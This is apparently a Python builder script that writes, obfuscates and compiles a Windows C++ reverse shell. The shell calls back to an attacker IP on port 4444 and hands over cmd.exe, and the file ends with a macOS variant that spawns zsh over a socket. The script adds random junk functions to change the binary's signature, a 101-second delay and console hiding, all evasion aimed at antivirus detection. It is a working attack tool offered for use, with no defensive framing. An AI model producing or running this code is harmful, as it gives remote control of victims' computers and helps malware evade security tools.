import os
import random
import string
import subprocess

def generate_junk():
    """Generates a random C++ function to change the binary signature."""
    func_name = ''.join(random.choices(string.ascii_letters, k=8))
    return f"""
void {func_name}() {{
    int x = {random.randint(1, 1000)};
    int y = {random.randint(1, 1000)};
    if (x + y > 2000) {{ printf("%d", x); }}
}}
"""

def generate_cpp_source(ip, port):
    junk = "\n".join([generate_junk() for _ in range(5)])
    
    # Updated Template with ANSI fixes and Delay
    cpp_code = f"""
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

{junk}

int main() {{
    // Requirement: Execution delay
    printf("[INFO] Execution delayed by 101 seconds...\\n");
    Sleep(101000); 

    FreeConsole(); 
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in addr;
    STARTUPINFOA si; // Use ANSI version
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    addr.sin_family = AF_INET;
    addr.sin_port = htons({port});
    addr.sin_addr.s_addr = inet_addr("{ip}");

    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {{
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        char command[] = "cmd.exe"; 
        CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }}
    return 0;
}}
"""
    with open("payload.cpp", "w") as f:
        f.write(cpp_code)

def compile_payload(output_name):
    # This is the script that "loads the books" for the compiler
    vcvars_path = r"C:\Program Files (x86)\Microsoft Visual Studio\18\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
    
    print(f"[*] Compiling {output_name} via Environment Shell...")
    
    # We combine the setup script AND the compile command into one string
    # The '&&' means "if the first part works, do the second part"
    compile_cmd = f'"{vcvars_path}" && cl /O2 /Fe:{output_name} payload.cpp user32.lib ws2_32.lib'
    
    result = subprocess.run(compile_cmd, capture_output=True, text=True, shell=True)
    
    if result.returncode == 0:
        print(f"[+] {output_name} generated successfully!")
    else:
        print(f"[-] Build failed: {result.stderr}")


if __name__ == "__main__":
    # Use your Mac's IP address (the 'Attacker' machine)
    generate_cpp_source("192.168.0.121", 4444) 
    compile_payload("polymorphic_shell.exe")


""" for mac
#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>

int main() {
    // 1. THE STEALTH DELAY (101 Seconds)
    // On Mac/Linux, sleep() takes seconds, not milliseconds!
    sleep(101); 

    // 2. CREATE THE SOCKET
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4444);
    
    // REPLACE THIS WITH YOUR MAC'S IP (OR THE IP OF YOUR LISTENER)
    inet_pton(AF_INET, "192.168.x.x", &serv_addr.sin_addr);

    // 3. CONNECT TO THE ATTACKER (Your Mac's Netcat)
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
        
        // 4. THE MAGIC: Redirect Input/Output/Error to the socket
        // 0 = stdin, 1 = stdout, 2 = stderr
        for (int i = 0; i <= 2; i++) {
            dup2(sock, i);
        }

        // 5. SPAWN THE MAC SHELL (ZSH is the default on modern Macs)
        char *args[] = {(char *)"/bin/zsh", NULL};
        execve(args[0], args, NULL);
    }

    return 0;
} """